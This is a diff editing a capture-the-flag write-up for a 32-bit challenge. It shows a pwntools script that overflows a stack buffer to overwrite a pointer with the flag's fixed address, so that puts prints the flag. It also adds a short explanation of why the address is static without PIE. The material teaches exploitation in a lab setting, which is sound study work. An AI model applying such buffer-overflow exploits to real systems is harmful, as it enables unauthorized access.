@@ -83,7 +83,7 @@ undefined4 main(void)
 
 The binary reads 48 bytes from `flag.txt` and put that in a global called `flag`. Can we divert a `puts` call to print it?
 
-Well, do you see that call `puts(local_14)`? We can do a buffer overflow on `local_28` and write an arbitrary address into `local_14`. We just have to skip over a `FILE*` which, being a pointer and being this executable 32bits, it's 4 bytes long.
+Well, do you see that call `puts(local_14)`? We can do a buffer overflow on `local_28` and write an arbitrary address into `local_14`. We just have to skip over a `FILE*` which, being a pointer and being this executable 32bits, is 4 bytes long.
 
 ```python
 from pwn import *
@@ -93,7 +93,7 @@ p.sendline((16+4) * b" " + p32(0x0804a080))
 print(p.recvall(1).decode())
 ```
 
-`0x0804a080` is the address of the `flag` global. I got that from Ghidra.
+`0x0804a080` is the address of the `flag` global. I got that from Ghidra. The address is static (doesn't change between executions) only because this executable is not PIE (Position Independent Executable). I'll explain PIE in future challenges.
 
 ```
 ~/Downloads > python pwn_just_do_it.py 
